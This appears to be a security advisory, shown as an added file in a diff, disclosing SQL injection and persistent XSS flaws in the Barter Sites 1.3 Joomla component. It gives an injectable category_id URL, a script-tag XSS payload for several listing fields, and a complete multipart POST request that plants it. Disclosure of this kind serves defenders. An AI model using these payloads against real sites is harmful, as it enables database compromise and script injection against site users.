@@ -1,0 +1,141 @@
+####################################################################################
+Barter Sites 1.3 Component Joomla SQL Injection & Persistent XSS vulnerabilities
+####################################################################################
+ 
+Release Date Bug.          28-Oct-2011
+Date Added.                01-Oct-2011
+Vendor Notification Date.  Never
+Product.                   Barter Sites
+Platform.                  Joomla
+Affected versions.         1.3
+Type.                      Commercial
+Price.                     $99
+Attack Vector.             Sql Injection & Persistent XSS
+Solution Status.           unpublished
+CVE reference.             Not yet assigned
+Download.                  www.barter-sites.com/content/getStarted
+
+ 
+ 
+I. BACKGROUND
+ 
+The Barter Sites extension is for operating a trade group.
+Members post listings in the barter directory on your site,
+send each other offers and messages, negotiate, and 'pay' 
+with either direct trade or with your own private digital 
+currency called trade credits. You can even issue lines of 
+credit.
+
+Admin has the option to earn commissions on trade credit 
+transfers and can run transactions for the members, serving 
+as a barter broker.
+
+Features Include:
+
+* HTML Listings
+* Barter Wish-list
+* Direct Trade Offers
+* Virtual Private Currency
+* Trade Credit Transfers
+* Admin Broker/Transfer
+* Generate Invoices
+* Paypal Commissions
+* Member Reputations
+* Private Messaging
+* and more!
+ 
+II. DESCRIPTION
+ 
+Two vulnerabilities discovered
+- Category_id Parameter SQL injection
+- XSS in several places
+ 
+ 
+III.  EXPLOITATION
+ 
+*INJECTION SQL
+ 
+parameter [category_id]:
+
+/index.php?option=com_listing&task=browse&category_id=1[SQL]
+ 
+[SQL]=Injection Sql
+ 
+
+*Persistent XSS main
+
+Register->> Login ---> barter>Post: or /index.php?option=com_listing&task=post&Itemid=2
+Listing Title: <IMG """><SCRIPT>alert("XSS")</SCRIPT>
+selection  category.
+
+XSS look at: barter>selection  category
+
+---->To view the xss is not necessary to be registered
+
+
+*Persistent XSS side
+
+In the form of the Post, you can insert xss in all settings:
+-Website Address
+-Payment types accepted
+-Sell Price
+-Shipping Cost
+-Quantity
+all can be inserted into the header, but for Facilides directly on the form
+
+all: <IMG """><SCRIPT>alert("XSS")</SCRIPT>
+
+
+
+*Persistent XSS in pictures
+
+If you prefer pictures to insert in the xss edit header values as follows:
+
+Get:/index.php?option=com_listing&task=listingsave
+Post:
+
+-----------------------------106542362324353\r\n
+Content-Disposition: form-data; name="listing_title"\r\n
+\r\n
+\r\n
+-----------------------------106542362324353\r\n
+Content-Disposition: form-data; name="description"\r\n
+\r\n
+<p><IMG """><SCRIPT>alert("XSS")</SCRIPT></p>\r\n  <-----------------------------------click here
+-----------------------------106542362324353\r\n
+Content-Disposition: form-data; name="homeurl"\r\n
+\r\n
+\r\n
+-----------------------------106542362324353\r\n
+Content-Disposition: form-data; name="category_id"\r\n
+\r\n
+34\r\n
+-----------------------------106542362324353\r\n
+Content-Disposition: form-data; name="paystring"\r\n
+\r\n
+\r\n
+-----------------------------106542362324353\r\n
+Content-Disposition: form-data; name="sell_price"\r\n
+\r\n
+\r\n
+-----------------------------106542362324353\r\n
+Content-Disposition: form-data; name="shipping_cost"\r\n
+\r\n
+\r\n
+-----------------------------106542362324353\r\n
+Content-Disposition: form-data; name="quantity"\r\n
+\r\n
+\r\n
+-----------------------------106542362324353\r\n
+Content-Disposition: form-data; name="submit"\r\n
+\r\n
+Submit\r\n
+-----------------------------106542362324353\r\n
+Content-Disposition: form-data; name="listing_id"\r\n
+\r\n
+\r\n
+-----------------------------106542362324353--\r\n
+
+
+Discovered by.
+Chris Russell
